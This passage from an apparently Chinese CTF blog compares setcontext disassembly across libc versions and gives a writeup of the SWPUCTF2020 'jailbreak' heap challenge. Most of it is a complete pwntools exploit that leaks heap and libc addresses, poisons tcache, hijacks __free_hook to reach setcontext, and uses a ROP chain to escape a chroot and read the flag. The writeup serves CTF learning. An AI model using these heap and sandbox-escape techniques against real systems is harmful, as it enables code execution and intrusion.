class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;setcontext+53&gt;:      mov    rsp,QWORD PTR [rdi+0xa0]</span><br><span class="line">&lt;setcontext+60&gt;:      mov    rbx,QWORD PTR [rdi+0x80]</span><br><span class="line">&lt;setcontext+67&gt;:      mov    rbp,QWORD PTR [rdi+0x78]</span><br><span class="line">&lt;setcontext+71&gt;:      mov    r12,QWORD PTR [rdi+0x48]</span><br><span class="line">&lt;setcontext+75&gt;:      mov    r13,QWORD PTR [rdi+0x50]</span><br><span class="line">&lt;setcontext+79&gt;:      mov    r14,QWORD PTR [rdi+0x58]</span><br><span class="line">&lt;setcontext+83&gt;:      mov    r15,QWORD PTR [rdi+0x60]</span><br><span class="line">&lt;setcontext+87&gt;:      mov    rcx,QWORD PTR [rdi+0xa8]</span><br><span class="line">&lt;setcontext+94&gt;:      push   rcx</span><br><span class="line">&lt;setcontext+95&gt;:      mov    rsi,QWORD PTR [rdi+0x70]</span><br><span class="line">&lt;setcontext+99&gt;:      mov    rdx,QWORD PTR [rdi+0x88]</span><br><span class="line">&lt;setcontext+106&gt;:     mov    rcx,QWORD PTR [rdi+0x98]</span><br><span class="line">&lt;setcontext+113&gt;:     mov    r8,QWORD PTR [rdi+0x28]</span><br><span class="line">&lt;setcontext+117&gt;:     mov    r9,QWORD PTR [rdi+0x30]</span><br><span class="line">&lt;setcontext+121&gt;:     mov    rdi,QWORD PTR [rdi+0x68]</span><br><span class="line">&lt;setcontext+125&gt;:     xor    eax,eax</span><br><span class="line">&lt;setcontext+127&gt;:     ret</span><br><span class="line">&lt;setcontext+128&gt;:     mov    rcx,QWORD PTR [rip+0x398c61]</span><br><span class="line">&lt;setcontext+135&gt;:     neg    eax</span><br><span class="line">&lt;setcontext+137&gt;:     mov    DWORD PTR fs:[rcx],eax</span><br><span class="line">&lt;setcontext+140&gt;:     or     rax,0xffffffffffffffff</span><br><span class="line">&lt;setcontext+144&gt;:     ret</span><br></pre></td></tr></table></figure><p><strong>libc 2.30 下 setcontext：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;setcontext+52&gt;:      fldenv [rcx]</span><br><span class="line">&lt;setcontext+54&gt;:      ldmxcsr DWORD PTR [rdx+0x1c0]</span><br><span class="line">&lt;setcontext+61&gt;:      mov    rsp,QWORD PTR [rdx+0xa0]</span><br><span class="line">&lt;setcontext+68&gt;:      mov    rbx,QWORD PTR [rdx+0x80]</span><br><span class="line">&lt;setcontext+75&gt;:      mov    rbp,QWORD PTR [rdx+0x78]</span><br><span class="line">&lt;setcontext+79&gt;:      mov    r12,QWORD PTR [rdx+0x48]</span><br><span class="line">&lt;setcontext+83&gt;:      mov    r13,QWORD PTR [rdx+0x50]</span><br><span class="line">&lt;setcontext+87&gt;:      mov    r14,QWORD PTR [rdx+0x58]</span><br><span class="line">&lt;setcontext+91&gt;:      mov    r15,QWORD PTR [rdx+0x60]</span><br><span class="line">&lt;setcontext+95&gt;:      test   DWORD PTR fs:0x48,0x2</span><br><span class="line">&lt;setcontext+107&gt;:     je     0x7f4ea94d71c6 &lt;setcontext+294&gt;</span><br><span class="line">&lt;setcontext+113&gt;:     mov    rsi,QWORD PTR [rdx+0x3a8]</span><br><span class="line">&lt;setcontext+120&gt;:     mov    rdi,rsi</span><br><span class="line">&lt;setcontext+123&gt;:     mov    rcx,QWORD PTR [rdx+0x3b0]</span><br><span class="line">&lt;setcontext+130&gt;:     cmp    rcx,QWORD PTR fs:0x78</span><br><span class="line">&lt;setcontext+139&gt;:     je     0x7f4ea94d7165 &lt;setcontext+197&gt;</span><br><span class="line">&lt;setcontext+141&gt;:     mov    rax,QWORD PTR [rsi-0x8]</span><br><span class="line">&lt;setcontext+145&gt;:     and    rax,0xfffffffffffffff8</span><br><span class="line">&lt;setcontext+149&gt;:     cmp    rax,rsi</span><br><span class="line">&lt;setcontext+152&gt;:     je     0x7f4ea94d7140 &lt;setcontext+160&gt;</span><br></pre></td></tr></table></figure><p>原来是以 rdi 作为基地址，在 libc 2.29 之后以 rdx 作为基地址。</p><h2 id="SWPUCTF2020-jailbreak"><a href="#SWPUCTF2020-jailbreak" class="headerlink" title="SWPUCTF2020 jailbreak"></a>SWPUCTF2020 jailbreak</h2><h3 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#39;&#x2F;ctf&#x2F;work&#x2F;jailbreak&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>程序限制操作次数，以及（正常情况下）允许分配的堆 size 总数，这个数存放在堆上：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201226011019.png" alt="image-20201226011019096"></p><p>程序初始化时调用 chroot 改变根目录：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201226005504.png" alt="image-20201226005504441"></p><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>自定义输入函数存在 off by one ：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210109134708.png" alt="image-20201226005326707"></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>libc 地址怎么都是要知道的，题目限制申请总 size ，先用 tcache 泄露堆地址。offbyone 创造出 tcachebin 重叠空间，修改在 tcachebin 中的堆得 fd 指针，指向到 size 所在空间，调大 size 。</p><p>重复上面构成堆重叠步骤在 tcache struct 上申请一个堆控制索引数量，将 0x90 索引数量调成 8 。溢出修改 size 位伪造出一个 0x90 的堆释放进入 unsortedbin 泄露地址。</p><p>重复上面构造堆重叠步骤修改 tcachebin fd 指针指向 free_hook ，将 tcache bin 其中一个开头地址修改为 __free hook 用于修改其值位 setcontent+53 。同时部署 setcontext 的上下文。利用 setcontext 构建出一个 read 写入，写入 ROP 链：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">执行chdir(fd)来实现chroot逃逸</span><br><span class="line">ORW 读取 flag</span><br></pre></td></tr></table></figure><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>本地复现时在 18.04 系统里面跑，没有 chroot 等等限制。。。将 __free_hook 改 onegadget 就 getshell 了。后面放到 docker 各种限制就又出现了。。。</p><blockquote><p>官方WP：<a href="https://wllm1013.github.io/2020/12/09/SWPUCTF2020-%E5%AE%98%E6%96%B9WP/#jailbreak">https://wllm1013.github.io/2020/12/09/SWPUCTF2020-%E5%AE%98%E6%96%B9WP/#jailbreak</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;sp&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>], arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./jailbreak&quot;</span>)</span><br><span class="line">lib = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./jailbreak&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">s</span>(<span class="params">data</span>):</span> <span class="keyword">return</span> sh.send(<span class="built_in">str</span>(data))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sa</span>(<span class="params">delim, data</span>):</span> <span class="keyword">return</span> sh.sendafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span>(<span class="params">data</span>):</span> <span class="keyword">return</span> sh.sendline(<span class="built_in">str</span>(data))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sla</span>(<span class="params">delim, data</span>):</span> <span class="keyword">return</span> sh.sendlineafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">r</span>(<span class="params">numb=<span class="number">4096</span></span>):</span> <span class="keyword">return</span> sh.recv(numb)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span>(<span class="params">delims, drop=<span class="literal">True</span></span>):</span> <span class="keyword">return</span> sh.recvuntil(delims, drop)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">irt</span>():</span> <span class="keyword">return</span> sh.interactive()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uu32</span>(<span class="params">data</span>):</span> <span class="keyword">return</span> u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uu64</span>(<span class="params">data</span>):</span> <span class="keyword">return</span> u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru7f</span>():</span> <span class="keyword">return</span> u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ruf7</span>():</span> <span class="keyword">return</span> u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lg</span>(<span class="params">data</span>):</span> <span class="keyword">return</span> log.success(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name_size, description_size</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Action:&quot;</span>, <span class="string">&quot;B&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Item name size:&quot;</span>, <span class="built_in">str</span>(name_size))</span><br><span class="line">    sla(<span class="string">&quot;Item description size:&quot;</span>, <span class="built_in">str</span>(description_size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, name, description</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Action:&quot;</span>, <span class="string">&quot;M&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="keyword">if</span> name != <span class="string">&quot;&quot;</span>:</span><br><span class="line">        sla(<span class="string">&quot;Modify name?[y/N]&quot;</span>, <span class="string">&quot;y&quot;</span>)</span><br><span class="line">        sa(<span class="string">&quot;new name:&quot;</span>, <span class="built_in">str</span>(name))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">&quot;Modify name?[y/N]&quot;</span>, <span class="string">&quot;n&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> description != <span class="string">&quot;&quot;</span>:</span><br><span class="line">        sla(<span class="string">&quot;Modify description?[y/N]&quot;</span>, <span class="string">&quot;y&quot;</span>)</span><br><span class="line">        sa(<span class="string">&quot;new description:&quot;</span>, <span class="built_in">str</span>(description))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">&quot;Modify description?[y/N]&quot;</span>, <span class="string">&quot;n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Action:&quot;</span>, <span class="string">&quot;S&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;Action:&quot;</span>, <span class="string">&quot;W&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;Action:&quot;</span>, <span class="string">&quot;\xFF&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Action[y/N]&quot;</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap_base</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="number">0x18</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&quot;Item name: &quot;</span>)</span><br><span class="line">heap_base = uu64(r(<span class="number">6</span>)) - <span class="number">0x280</span></span><br><span class="line">log.info(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># hijack money</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;\x13&#x27;</span> * <span class="number">0x18</span> + <span class="string">&quot;\n&quot;</span>, <span class="string">&#x27;\x14&#x27;</span> * <span class="number">0x18</span> + p8(<span class="number">0x41</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="number">0x29</span>)  <span class="comment"># 0x20;0x40</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;\x13&#x27;</span> * <span class="number">0x18</span> + <span class="string">&quot;\n&quot;</span>, <span class="string">&#x27;\x14&#x27;</span> * <span class="number">0x18</span> +</span><br><span class="line">     p64(<span class="number">0x21</span>) + p64(heap_base + <span class="number">0x250</span> + <span class="number">0x10</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">free(<span class="number">0</span>)  <span class="comment"># balance tcache number</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="number">0x18</span>)  <span class="comment"># 0x20;0x20</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="number">0x18</span>)  <span class="comment"># 0x20;0x20</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;\x15&#x27;</span> * <span class="number">0x18</span> + <span class="string">&quot;\n&quot;</span>, p64(<span class="number">0xcafecafe</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get fd</span></span><br><span class="line">backdoor()</span><br><span class="line">ru(<span class="string">&quot;secret:&quot;</span>)</span><br><span class="line">dir_fd = <span class="built_in">int</span>(ru(<span class="string">&quot;\n&quot;</span>).strip(), <span class="number">10</span>)</span><br><span class="line">log.info(<span class="string">&quot;dri_fd:&quot;</span>+<span class="built_in">hex</span>(dir_fd))</span><br><span class="line"></span><br><span class="line"><span class="comment"># hijack tache struct</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0x28</span>, <span class="number">0x28</span>)  <span class="comment"># 3</span></span><br><span class="line">edit(<span class="number">2</span>, <span class="string">&#x27;\x16&#x27;</span> * <span class="number">0x28</span> + p8(<span class="number">0x51</span>), <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x28</span>, <span class="number">0x48</span>)  <span class="comment"># 0x30;0x50</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">2</span>, <span class="string">&#x27;\x16&#x27;</span> * <span class="number">0x28</span> + <span class="string">&quot;\n&quot;</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x28</span> +</span><br><span class="line">     p64(<span class="number">0x31</span>) + p64(heap_base + <span class="number">0x10</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">add(<span class="number">0x28</span>, <span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0x28</span>, <span class="number">0x38</span>)  <span class="comment"># tcache struct;0x40 tbin</span></span><br><span class="line"><span class="comment"># set 0x90-&gt;8</span></span><br><span class="line">edit(<span class="number">4</span>, p64(<span class="number">0x0800000000000000</span>) + <span class="string">&quot;\n&quot;</span>, p64(<span class="number">0xdeadbeef</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc_base</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x38</span>, <span class="number">0x38</span>)</span><br><span class="line">edit(<span class="number">5</span>, <span class="string">&#x27;\x15&#x27;</span> * <span class="number">0x38</span> + p8(<span class="number">0x91</span>), <span class="string">&#x27;\x16&#x27;</span> * <span class="number">0x18</span> + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># bypass double free(!prev_inuse)</span></span><br><span class="line">edit(<span class="number">6</span>, <span class="string">&#x27;\n&#x27;</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x38</span>, <span class="number">0x38</span>)  <span class="comment"># 5</span></span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&quot;Item idx: 5&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;description: &quot;</span>)</span><br><span class="line">main_arena = uu64(r(<span class="number">6</span>)) - <span class="number">224</span></span><br><span class="line">libc = main_arena - <span class="number">0x10</span> - lib.symbols[<span class="string">b&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc))</span><br><span class="line"></span><br><span class="line">lib.address = libc</span><br><span class="line">system = lib.symbols[<span class="string">b&#x27;system&#x27;</span>]</span><br><span class="line">binsh = lib.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">__free_hook = lib.symbols[<span class="string">b&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;free_hook:&quot;</span>+<span class="built_in">hex</span>(__free_hook))</span><br><span class="line">__malloc_hook = lib.symbols[<span class="string">b&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc + <span class="number">0x00000000000215bf</span><span class="comment">#0x000000000002155f</span></span><br><span class="line">pop_rsi_ret = libc + <span class="number">0x0000000000023eea</span><span class="comment">#0x0000000000023e8a</span></span><br><span class="line">pop_rdx_ret = libc + <span class="number">0x0000000000001b96</span><span class="comment">#0x0000000000001b96</span></span><br><span class="line">pop_rdx_rsi_ret = libc + <span class="number">0x0000000000130569</span><span class="comment">#0x0000000000130889</span></span><br><span class="line">ret = libc + <span class="number">0x00000000000008aa</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, <span class="number">0x38</span>)  <span class="comment"># 7</span></span><br><span class="line">free(<span class="number">6</span>)  <span class="comment"># ???</span></span><br><span class="line"><span class="comment"># 0x60 : tcache 0x40</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>,p64(heap_base + <span class="number">0x60</span>) + <span class="string">&quot;\n&quot;</span>,<span class="string">&quot;flag.txt\x00&quot;</span>.ljust(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>) + p64(<span class="number">0x3c0</span> + heap_base) + p64(ret) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="comment"># heap_base+0x60 :tcache struct 0x40 chunk head</span></span><br><span class="line"><span class="comment"># setcontext data</span></span><br><span class="line"><span class="comment"># rsp:heap_base+0x3c0:chunk5</span></span><br><span class="line"><span class="comment"># rip:ret</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, <span class="number">0x48</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="number">0x48</span>)  <span class="comment"># 8</span></span><br><span class="line">edit(<span class="number">8</span>, p64(<span class="number">0xdeadbeef</span>) + <span class="string">&quot;\n&quot;</span>, p64(lib.sym[<span class="string">&#x27;__free_hook&#x27;</span>]) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="comment"># fix tcache 0x40</span></span><br><span class="line">edit(<span class="number">4</span>, p64(<span class="number">0x0800000000010000</span>) + <span class="string">&quot;\n&quot;</span>, p64(<span class="number">0xdeadbeef</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite free_hook</span></span><br><span class="line">log.info(<span class="string">&quot;setcontext:&quot;</span>+<span class="built_in">hex</span>(lib.sym[<span class="string">&#x27;setcontext&#x27;</span>]))</span><br><span class="line">add(<span class="number">0x38</span>, <span class="number">0x48</span>)  <span class="comment"># 9</span></span><br><span class="line">edit(<span class="number">9</span>, p64(lib.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span>) + <span class="string">&quot;\n&quot;</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># creat read</span></span><br><span class="line">edit(<span class="number">5</span>, p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_rsi_ret) + p64(<span class="number">0x1000</span>) +</span><br><span class="line">     p64(heap_base + <span class="number">0x3b0</span>) + p64(lib.sym[<span class="string">&#x27;read&#x27;</span>])+<span class="string">&quot;\n&quot;</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x40</span>-<span class="number">2</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(dir_fd)</span><br><span class="line">payload += p64(lib.sym[<span class="string">&#x27;fchdir&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(heap_base+<span class="number">0x4c0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(lib.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rdx_rsi_ret) + p64(<span class="number">0x100</span>) + p64(heap_base+<span class="number">0x440</span>)</span><br><span class="line">payload += p64(lib.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdx_rsi_ret) + p64(<span class="number">0x100</span>) + p64(heap_base+<span class="number">0x400</span>)</span><br><span class="line">payload += p64(lib.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"><span class="comment"># payload += p64(pop_rdi_ret) + p64(binsh)</span></span><br><span class="line"><span class="comment"># payload += p64(ret)</span></span><br><span class="line"><span class="comment"># payload += p64(system)</span></span><br><span class="line">sl(payload)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># sl(&quot;echo deadbeef &amp;&amp; cd ../ &amp;&amp; cat flag.txt&quot;)</span></span><br><span class="line"><span class="comment"># ru(&quot;deadbeef&quot;)</span></span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="http://blog.eonew.cn/archives/993">setcontext 函数exploit</a></p><p><a href="https://blog.csdn.net/qq_43116977/article/details/107580414">DASCTF 7月部分pwn</a></p><p><a href="http://www.jx-zhang.xyz/2019/12/29/chroot_jail">chroot jail break in CTF from 0 to -1</a></p><p>[高校战“疫”网络安全分享赛pwn部分wp]</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 沙盒 </tag>
            
            <tag> 堆溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HWS冬令营选拔赛部分Writeup</title>
      <link href="archives/222/"/>
      <url>archives/222/</url>
      
